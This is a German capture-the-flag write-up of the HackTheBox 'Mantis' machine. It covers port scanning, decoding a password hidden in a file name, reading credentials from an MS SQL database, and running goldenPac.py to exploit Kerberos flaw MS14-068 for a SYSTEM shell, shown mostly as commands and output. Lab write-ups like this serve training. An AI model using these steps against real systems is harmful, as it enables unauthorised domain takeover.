---
title: "HackTheBox - Mantis WriteUp | Tipps + Anleitung"
date: 2018-02-26T15:28:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
  - german
---

[Mantis](https://www.hackthebox.eu/home/machines/profile/98) ist eine der schwierigeren CTF Challenges von [HackTheBox](https://hackthebox.eu/). Allerdings ist die [Mantis](https://www.hackthebox.eu/home/machines/profile/98) relativ einfach, wenn man weiß, was man macht.

[![wertung](https://imgur.com/GREBRkf.jpg)](https://imgur.com/GREBRkf)

## **Tipps**

- Port 8080 ist nicht der richtige HTTP Port. Außerdem sollte eine größere Wörterliste für das Directory Bruteforcing benutzt werden.
- Um an User und Root zu kommen, musst du einen Exploit für die kritische Kerberos Schwachstelle [MS14-068](https://docs.microsoft.com/de-de/security-updates/SecurityBulletins/2014/ms14-068) benutzen.
- GoldenPac.py von [Impacket](https://github.com/CoreSecurity/impacket), kann es dir einfacher machen.

## **Video**

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/mTuHL0SHDVY/0.jpg)](http://www.youtube.com/watch?v=mTuHL0SHDVY)

## **Anleitung**

Als erstes machen wir wie immer einen Nmap-Scan. Wir scannen alle Ports mit **-p-** und lassen uns mit **-A** Informationen zum einen zu den jeweiligen Services anzeigen und zum anderen ein paar Skripte laufen.

```shell
root@kali:~# nmap -A -p- 10.10.10.52

[...]
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601
| dns-nsid: 
|_ bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http          Microsoft IIS httpd 7.5
| http-methods: 
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
| Target_Name: HTB
| NetBIOS_Domain_Name: HTB
| NetBIOS_Computer_Name: MANTIS
| DNS_Domain_Name: htb.local
| DNS_Computer_Name: mantis.htb.local
| DNS_Tree_Name: htb.local
|_ Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2018-02-26T05:06:38
|_Not valid after: 2048-02-26T05:06:38
|_ssl-date: 2018-02-26T14:24:03+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=mantis.htb.local
| Not valid before: 2018-02-25T13:21:18
|_Not valid after: 2018-08-27T13:21:18
|_ssl-date: 2018-02-26T14:24:06+00:00; 0s from scanner time.
5722/tcp  open  msrpc         Microsoft Windows RPC
8080/tcp  open  http          Microsoft IIS httpd 7.5
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49164/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
50255/tcp open  unknown
[...]

Host script results:
| ms-sql-info: 
| 10.10.10.52:1433: 
| Version: 
| name: Microsoft SQL Server 2014 RTM
| number: 12.00.2000.00
| Product: Microsoft SQL Server 2014
| Service pack level: RTM
| Post-SP patches applied: false
|_ TCP port: 1433
| smb-os-discovery: 
| OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
| Computer name: mantis
| NetBIOS computer name: MANTIS\x00
| Domain name: htb.local
| Forest name: htb.local
| FQDN: mantis.htb.local
|_ System time: 2018-02-26T09:24:06-05:00
| smb-security-mode: 
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: required
| smb2-security-mode: 
| 2.02: 
|_ Message signing enabled and required
| smb2-time: 
| date: 2018-02-26 15:24:06
|_ start_date: 2018-02-26 06:06:11
[...]
```

Bei Port **1337** läuft ein HTTP-Server. Das Skript **smb-os-discovery** findet heraus, dass das Betriebssystem **Windows Server 2008 R2 Service Pack 1**, der Computer-Name **mantis** und der Domain-Name **htb.local** ist. Diese Informationen werden uns später noch nützlich sein. Außerdem läuft auf Port **1433** ein **Microsoft SQL Server**.

Als nächstes sehen wir nach, welche Verzeichnisse wir finden können.

```shell
root@kali:~# gobuster -u 10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25

Gobuster v1.2 OJ Reeves (@TheColonial)
=====================================================
[+] Mode : dir
[+] Url/Domain : http://10.10.10.52:1337/
[+] Threads : 25
[+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/secure_notes (Status: 301)
=====================================================
```

**secure_notes** ist das einzige Verzeichnis, welches gefunden wurde.


Sehen wir uns **secure_notes** mal an.

[![secure notes](https://imgur.com/Dcz52w6.jpg)](https://imgur.com/Dcz52w6)

Wir sehen zwei Dateien. **web.config** ist uninteressant, aber **dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt **hat einige interessante Informationen für uns. Der Inhalt der Datei ist wie folgt:

```shell
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
```

Es wird also wahrscheinlich ein **SQL server 2014 Express** benutzt, welcher eine Datenbank namens **orcharddb** mit dem Benutzer **admin** hat.

Die Text-Datei hat einen merkwürdigen Namen, der nach einer Base64 Kodierung aussieht.

```shell
root@kali:~# echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
6d2424716c5f53405f504073735730726421
```

Der String den wir nach der Dekodierung erhalten, sieht nach Hexadezimal aus, da nur Buchstaben bis F und Zahlen vorkommen.

```shell
root@kali:~# echo 6d2424716c5f53405f504073735730726421 | xxd -r -p
m$ql_S@_P@ssW0rd!
```

Wir haben anscheinen ein Passwort erhalten.

Versuchen wir uns mal mit dem Benutzernamen **admin** und dem Passwort **m$$ql_S@_P@ssW0rd!** bei der SQL-Datenbank anzumelden. Ich benutze dafür DBeaver.

```shell
root@kali:~# dbeaver
```

Als erstes wählen wir **MS SQL Server** aus.

[![ms sql](https://imgur.com/hJQ4dcp.jpg)](https://imgur.com/hJQ4dcp)

Dann müssen noch die erforderlichen Daten eingeben. Dank unseres Nmap-Scans wissen wir, dass der Standard-Port 1433 benutzt wird.

[![einstellungen](https://imgur.com/ttb6nea.jpg)](https://imgur.com/ttb6nea)

Jetzt noch zwei Mal auf **Next** und dann auf **Finish** klicken.

Als nächstes suchen wir nach einer Tabelle mit Benutzer Zugangsdaten.

[![tables](https://imgur.com/3t0UZij.jpg)](https://imgur.com/3t0UZij)

Die Tabelle **blog_Orchard_Users_UserPartRecord** enthält Zugangsdaten für die Benutzer **admin** und **James**. Der Benutzer **admin** hat normalerweise ein verschlüsseltes Password, allerdings hat jemand anderes dieses zu 1111 geändert...

Beim Benutzer **James** ist es allerdings gewollt, dass sein Passwort nicht verschlüsselt ist. Merken wir uns also sein Passwort **J@m3s_P@ssW0rd!**

[![credentials](https://imgur.com/COpkwm4.jpg)](https://imgur.com/COpkwm4)

Für den nächsten Schritt müssen wir unsere **/etc/hosts** Datei bearbeiten, welche dafür benutzt wird um Rechnernamen in IP-Adressen aufzulösen.

```shell
root@kali:~/impacket# vi /etc/hosts

127.0.0.1 localhost
127.0.1.1 kali
10.10.10.52 mantis.htb.local htb.local

# The following lines are desirable for IPv6 capable hosts
::1 localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Als nächstes können wir das Python Skript **goldenPac.py** von der Python Klassen Sammlung [Impacket](https://github.com/CoreSecurity/impacket) benutzen, um die kritische Kerberos Schwachstelle [MS14-068](https://docs.microsoft.com/de-de/security-updates/SecurityBulletins/2014/ms14-068) auszunutzen.

```shell
root@kali:~/impacket# goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file TBDMYhpQ.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service sust on mantis.htb.local.....
[*] Starting service sust.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```


Jetzt können wir uns die User und die Root Flag abholen.

```shell
C:\Windows\system32>cd C:/users

C:\Users>dir
Volume in drive C has no label.
Volume Serial Number is 1A7A-6541

Directory of C:\Users

09/01/2017 09:19 AM <DIR> .
09/01/2017 09:19 AM <DIR> ..
09/01/2017 12:39 AM <DIR> Administrator
09/01/2017 08:02 AM <DIR> Classic .NET AppPool
09/01/2017 09:19 AM <DIR> james
09/01/2017 08:15 AM <DIR> MSSQL$SQLEXPRESS
07/13/2009 11:57 PM <DIR> Public
0 File(s) 0 bytes
7 Dir(s) 921,141,248 bytes free

C:\Users>cd james

C:\Users\james>cd Desktop

C:\Users\james\Desktop>dir
Volume in drive C has no label.
Volume Serial Number is 1A7A-6541

Directory of C:\Users\james\Desktop

09/01/2017 01:10 PM <DIR> .
09/01/2017 01:10 PM <DIR> ..
09/01/2017 09:19 AM 32 user.txt
1 File(s) 32 bytes
2 Dir(s) 921,141,248 bytes free

C:\Users\james\Desktop>more user.txt
8a8#########ZENSIERT#########54d
```

```shell
C:\Users\james\Desktop>cd ..

C:\Users\james>cd ..

C:\Users>cd admin
The system cannot find the path specified.

C:\Users>cd Administrator

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir
Volume in drive C has no label.
Volume Serial Number is 1A7A-6541

Directory of C:\Users\Administrator\Desktop

09/01/2017 01:10 PM <DIR> .
09/01/2017 01:10 PM <DIR> ..
09/01/2017 09:16 AM 32 root.txt
1 File(s) 32 bytes
2 Dir(s) 921,141,248 bytes free

C:\Users\Administrator\Desktop>more root.txt
209#########ZENSIERT#########567
```

Vielen Dank für's durchlesen. :)